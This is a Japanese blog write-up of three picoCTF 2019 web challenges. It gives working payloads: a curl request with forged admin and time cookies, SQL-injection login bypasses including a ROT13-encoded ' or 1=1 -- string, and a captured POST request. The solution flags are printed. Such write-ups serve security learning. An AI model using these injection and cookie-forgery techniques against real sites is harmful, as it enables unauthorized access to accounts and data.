---
title: "picoCTF 2019 Writeup (Web Exploitation)"
date: 2019-10-13T12:00:00+09:00
lastmod: 2019-10-13T12:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fpicoctf_2019_web%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://2019game.picoctf.com/](https://2019game.picoctf.com/)
<br /><br />
2週間、お疲れ様です。

<br /><br />
最終結果は、こんな感じ。

<img src="https://captureamerica.github.io/writeups/img/pico2019_Score.png" alt="pico2019_Score.png">

<br />
イベント終了時点で、ユーザは4万人弱でした。

<img src="https://captureamerica.github.io/writeups/img/pico2019_Users.png" alt="pico2019_Users.png">

<img src="https://captureamerica.github.io/writeups/img/pico2019_Rank.png" alt="pico2019_Rank.png">

PwnとWeb系があんまりできてないけど、スコアも切りのいい20000に行ったし、Globalで目標の300位以内 (283位) にも入れたのでかなり満足です。

去年出た問題に似てるものも結構あったので、picoCTF 2018をそれなりにやった人は結構アドバンテージがあったと思います。



<br /><br />
Web Exploitation の Writeupです。




<br /><br />
## [Web Exploitation]: Open-to-admins (200 points)
- - -
### Challenge
> This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. https://2019shell1.picoctf.com/problem/32249/ (link) or http://2019shell1.picoctf.com:32249
<br /><br />
Hints : Can cookies help you to get the flag?<br />

<br />
### Solution
```
curl -k -H 'Cookie: admin=True; time=1400'  https://2019shell1.picoctf.com/problem/32249/flag
```


Flag: `picoCTF{0p3n_t0_adm1n5_cc661e91}`



<br /><br />
<br /><br />
## [Web Exploitation]: Irish-Name-Repo 2 (350 points)
- - -
### Challenge
> There is a website running at https://2019shell1.picoctf.com/problem/60775/ (link). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://2019shell1.picoctf.com:60775
<br /><br />
Hints : The password is being filtered.

<br />
### Solution
picoCTF 2018のVaultと同じ問題です。

デバッグを見ようとして、以下を入れたら、Flag取れちゃった。
```
username
' /*

password
*/ or 3=3 -- &debug=1
```

Flag: `picoCTF{m0R3_SQL_plz_015815e2}`




<br /><br />
<br /><br />
## [Web Exploitation]: Irish-Name-Repo 3 (400 points)
- - -
### Challenge
> There is a secure website running at https://2019shell1.picoctf.com/problem/12271/ (link) or http://2019shell1.picoctf.com:12271. Try to see if you can login as admin!
<br /><br />
Hints : Seems like the password is encrypted.


<br />
### Solution
Burpでやったらdebug変数が見えたので、1に変えてみました。

```
POST /problem/12271/login.php HTTP/1.1
Host: 2019shell1.picoctf.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Connection: close
Referer: https://2019shell1.picoctf.com/problem/12271/login.html
Upgrade-Insecure-Requests: 1

password=admin&debug=1
```

```
password: admin
SQL query: SELECT * FROM admin where password = 'nqzva'
```

'nqzva' は、'admin' のRot13ですね。

<br />
いつものこの子を、
```
' or 1=1 --
```

Rot13して以下のようにします。
```
' be 1=1 --
```

Flag: `picoCTF{3v3n_m0r3_SQL_ef7eac2f}`



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

